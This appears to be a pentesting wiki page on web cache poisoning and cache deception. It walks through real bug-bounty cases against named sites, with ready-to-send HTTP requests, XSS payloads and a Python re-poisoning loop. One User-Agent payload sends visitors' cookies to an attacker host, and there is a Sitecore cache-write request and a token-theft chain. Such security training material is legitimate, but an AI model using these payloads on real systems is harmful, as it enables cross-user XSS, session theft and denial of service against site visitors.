# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## The difference

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

Cache poisoning is aimed at manipulating the client-side cache to force clients to load resources that are unexpected, partial, or under the control of an attacker. The extent of the impact is contingent on the popularity of the affected page, as the tainted response is served exclusively to users visiting the page during the period of cache contamination.

The execution of a cache poisoning assault involves several steps:

1. **Identification of Unkeyed Inputs**: These are parameters that, although not required for a request to be cached, can alter the response returned by the server. Identifying these inputs is crucial as they can be exploited to manipulate the cache.
2. **Exploitation of the Unkeyed Inputs**: After identifying the unkeyed inputs, the next step involves figuring out how to misuse these parameters to modify the server's response in a way that benefits the attacker.
3. **Ensuring the Poisoned Response is Cached**: The final step is to ensure that the manipulated response is stored in the cache. This way, any user accessing the affected page while the cache is poisoned will receive the tainted response.

### Discovery: Check HTTP headers

Usually, when a response was **stored in the cache** there will be a **header indicating so**, you can check which headers you should pay attention to in this post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

If you are thinking that the response is being stored in a cache, you could try to **send requests with a bad header**, which should be responded to with a **status code 400**. Then try to access the request normally and if the **response is a 400 status code**, you know it's vulnerable (and you could even perform a DoS).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

However, note that **sometimes these kinds of status codes aren't cached** so this test could not be reliable.

### Discovery: Identify and evaluate unkeyed inputs

You could use [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to **brute-force parameters and headers** that may be **changing the response of the page**. For example, a page may be using the header `X-Forwarded-For` to indicate the client to load the script from there:

```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```

### Elicit a harmful response from the back-end server

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

### Get the response cached

Once you have **identified** the **page** that can be abused, which **parameter**/**header** to use and **how** to **abuse** it, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

### Foundational cache poisoning case studies

#### HackerOne global redirect via `X-Forwarded-Host`

- The origin templated redirects and canonical URLs with `X-Forwarded-Host`, but the cache key only used the `Host` header, so a single response poisoned every visitor to `/`.
- Poison with:

```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```

- Immediately re-request `/` without the spoofed header; if the redirect persists you have a global host-spoofing primitive that often upgrades reflected redirects/Open Graph links into stored issues.

#### GitHub repository DoS via `Content-Type` + `PURGE`

- Anonymous traffic was keyed only on path, while the backend entered an error state when it saw an unexpected `Content-Type`. That error response was cacheable for every unauthenticated user of a repo.
- GitHub also (accidentally) honored the `PURGE` verb, letting the attacker flush a healthy entry and force caches to pull the poisoned variant on demand:

```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```

- Always compare authenticated vs anonymous cache keys, fuzz rarely keyed headers such as `Content-Type`, and probe for exposed cache-maintenance verbs to automate re-poisoning.

#### Shopify cross-host persistence loops

- Multi-layer caches sometimes require multiple identical hits before committing a new object. Shopify reused the same cache across numerous localized hosts, so persistence meant impact on many properties.
- Use short automation loops to repeatedly reseed:

```python
import requests, time
for i in range(100):
    requests.get("https://shop.shopify.com/endpoint",
                 headers={"X-Forwarded-Host": "attacker.com"})
    time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```

- After a `hit` response, crawl other hosts/assets that share the same cache namespace to demonstrate cross-domain blast radius.

#### JS asset redirect → stored XSS chain

- Private programs often host shared JS such as `/assets/main.js` across dozens of subdomains. If `X-Forwarded-Host` influences redirect logic for those assets but is unkeyed, the cached response becomes a 301 to attacker JS, yielding stored XSS everywhere the asset is imported.

```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

- Map which hosts reuse the same asset path so you can prove multi-subdomain compromise.

#### GitLab static DoS via `X-HTTP-Method-Override`

- GitLab served static bundles from Google Cloud Storage, which honors `X-HTTP-Method-Override`. Overriding GET to HEAD returned a cacheable `200 OK` with `Content-Length: 0`, and the edge cache ignored the HTTP method when generating the key.

```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```

- A single request replaced the JS bundle with an empty body for every GET, effectively DoSing the UI. Always test method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) against static assets and confirm whether the cache varies on method.

#### HackerOne static asset loop via `X-Forwarded-Scheme`

- Rails’ Rack middleware trusted `X-Forwarded-Scheme` to decide whether to enforce HTTPS. Spoofing `http` against `/static/logo.png` triggered a cacheable 301 so all users subsequently received redirects (or loops) instead of the asset:

```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```

- Combine scheme spoofing with host spoofing when possible to craft irreversible redirects for highly visible resources.

#### Cloudflare host-header casing mismatch

- Cloudflare normalized the `Host` header for cache keys but forwarded the raw casing to origins. Sending `Host: TaRgEt.CoM` triggered alternate behavior in origin routing/templating while still populating the canonical lowercase cache bucket.

```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```

- Enumerate CDN tenants by replaying mixed-case hosts (and other normalized headers) and diff the cached response versus the origin response to uncover shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- Injecting `X-Forwarded-Host` inside Open Graph tags turned a reflected HTML injection into a stored XSS once the CDN cached the page. Use a harmless cache buster during testing to avoid harming production users:

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```

- Social media scrapers consume cached Open Graph tags, so a single poisoned entry distributes the payload far beyond direct visitors.

## Exploiting Examples

### Easiest example

A header like `X-Forwarded-For` is being reflected in the response unsanitized.\
You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:

```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** it's explained the following simple scenario:

- The CDN will cache anything under `/share/`
- The CDN will NOT decode nor normalize `%2F..%2F`, therfore, it can be used as **path traversal to access other sensitive locations that will be cached** like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- The web server WILL decode and normalize `%2F..%2F`, and will respond with `/api/auth/session`, which **contains the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies could also be reflected on the response of a page. If you can abuse it to cause a XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.

```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```

Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Check:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

This is also explained better in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Sometimes you will need to **exploit several unkeyed inputs** to be able to abuse a cache. For example, you may find an **Open redirect** if you set `X-Forwarded-Host` to a domain controlled by you and `X-Forwarded-Scheme` to `http`.**If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect. You can control where the page is pointed by the redirect.

```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```

### Exploiting with limited `Vary`header

If you found that the **`X-Host`** header is being used as **domain name to load a JS resource** but the **`Vary`** header in the response is indicating **`User-Agent`**. Then, you need to find a way to exfiltrate the User-Agent of the victim and poison the cache using that user agent:

```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```

### Fat Get

Send a GET request with the request in the URL and in the body. If the web server uses the one from the body but the cache server caches the one from the URL, anyone accessing that URL will actually use the parameter from the body. Like the vuln James Kettle found at the Github website:

```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

For example it's possible to separate **parameters** in ruby servers using the char **`;`** instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Learn here about how to perform [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) can be used to automatically test for web cache poisoning. It supports many different techniques and is highly customizable.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

This real-world pattern chains a header-based reflection primitive with CDN/WAF behavior to reliably poison the cached HTML served to other users:

- The main HTML reflected an untrusted request header (e.g., `User-Agent`) into executable context.
- The CDN stripped cache headers but an internal/origin cache existed. The CDN also auto-cached requests ending in static extensions (e.g., `.js`), while the WAF applied weaker content inspection to GETs for static assets.
- Request flow quirks allowed a request to a `.js` path to influence the cache key/variant used for the subsequent main HTML, enabling cross-user XSS via header reflection.

Practical recipe (observed across a popular CDN/WAF):

1) From a clean IP (avoid prior reputation-based downgrades), set a malicious `User-Agent` via browser or Burp Proxy Match & Replace.
2) In Burp Repeater, prepare a group of two requests and use "Send group in parallel" (single-packet mode works best):
   - First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
   - Immediately after: GET the main page (`/`).
3) The CDN/WAF routing race plus the auto-cached `.js` often seeds a poisoned cached HTML variant that is then served to other visitors sharing the same cache key conditions (e.g., same `Vary` dimensions like `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):

```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```

Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:

```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```

This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Vulnerable Examples

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS forwarded the fragment inside the URL without stripping it and generated the cache key only using the host, path and query (ignoring the fragment). So the request `/#/../?r=javascript:alert(1)` was sent to the backend as `/#/../?r=javascript:alert(1)` and the cache key didn't have the payload inside of it, only host, path and query.

### 403 and Storage Buckets

Cloudflare previously cached 403 responses. Attempting to access S3 or Azure Storage Blobs with incorrect Authorization headers would result in a 403 response that got cached. Although Cloudflare has stopped caching 403 responses, this behavior might still be present in other proxy services.

### Injecting Keyed Parameters

Caches often include specific GET parameters in the cache key. For instance, Fastly's Varnish cached the `size` parameter in requests. However, if a URL-encoded version of the parameter (e.g., `siz%65`) was also sent with an erroneous value, the cache key would be constructed using the correct `size` parameter. Yet, the backend would process the value in the URL-encoded parameter. URL-encoding the second `size` parameter led to its omission by the cache but its utilization by the backend. Assigning a value of 0 to this parameter resulted in a cacheable 400 Bad Request error.

### User Agent Rules

Some developers block requests with user-agents matching those of high-traffic tools like FFUF or Nuclei to manage server load. Ironically, this approach can introduce vulnerabilities such as cache poisoning and DoS.

### Illegal Header Fields

The [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifies the acceptable characters in header names. Headers containing characters outside of the specified **tchar** range should ideally trigger a 400 Bad Request response. In practice, servers don't always adhere to this standard. A notable example is Akamai, which forwards headers with invalid characters and caches any 400 error, as long as the `cache-control` header is not present. An exploitable pattern was identified where sending a header with an illegal character, such as `\`, would result in a cacheable 400 Bad Request error.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

First of all note that **extensions** such as `.css`, `.js`, `.png` etc are usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js` the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying** with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other users.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and the cache server is going to save the result.\
Then, the **attacker** can access _http://www.example.com/home.php/non-existent.css_ in their own browser and observe the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type.

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

High level idea:

- A sensitive API endpoint requires a custom auth header and is correctly marked as non-cacheable by origin.
- Appending a static-looking suffix (for example, .css) makes the CDN treat the path as a static asset and cache the response, often without varying on sensitive headers.
- The SPA contains CSPT: it concatenates a user-controlled path segment into the API URL while attaching the victim’s auth header (for example, X-Auth-Token). By injecting ../.. traversal, the authenticated fetch is redirected to the cacheable path variant (…/v1/token.css), causing the CDN to cache the victim’s token JSON under a public key.
- Anyone can then GET that same cache key without authentication and retrieve the victim’s token.

Example

- Sensitive endpoint (non-cacheable at origin):

```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

- Static-looking suffix flips CDN to cacheable:

```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

- CSPT in SPA attaches auth header and allows traversal:

```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
  method: 'GET',
  headers: { 'X-Auth-Token': authToken }
});
```

- Exploit chain:
  1. Lure victim to a URL that injects dot-segments into the SPA path parameter, e.g.:
     - [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
  2. The SPA issues an authenticated fetch to:
     - [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
  3. Browser normalization resolves it to:
     - [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
  4. The CDN treats .css as a static asset and caches the JSON with Cache-Control: public, max-age=...
  5. Public retrieval: anyone can then GET https://api.example.com/v1/token.css and obtain the cached token JSON.

Preconditions

- SPA performs authenticated fetch/XHR to the same API origin (or cross-origin with working CORS) and attaches sensitive headers or bearer tokens.
- Edge/CDN applies extension-based caching for static-looking paths (e.g., *.css, *.js, images) and does not vary the cache key on the sensitive header.
- Origin for the base endpoint is non-cacheable (correct), but the extension-suffixed variant is allowed or not blocked by edge rules.

Validation checklist

- Identify sensitive dynamic endpoints and try suffixes like .css, .js, .jpg, .json. Look for Cache-Control: public/max-age and X-Cache: Hit (or equivalent, e.g., CF-Cache-Status) while content remains JSON.
- Locate client code that concatenates user-controlled input into API paths while attaching auth headers. Inject ../ sequences to redirect the authenticated request to your target endpoint.
- Confirm the authenticated header is present on the retargeted request (e.g., in a proxy or via server-side logs) and that the CDN caches the response under the traversed path.
- From a fresh context (no auth), request the same path and confirm the secret JSON is served from cache.

## Automatic Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.
- [**CacheDecepHound**](https://github.com/g4nkd/CacheDecepHound): Python scanner designed to detect Cache Deception vulnerabilities in web servers.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
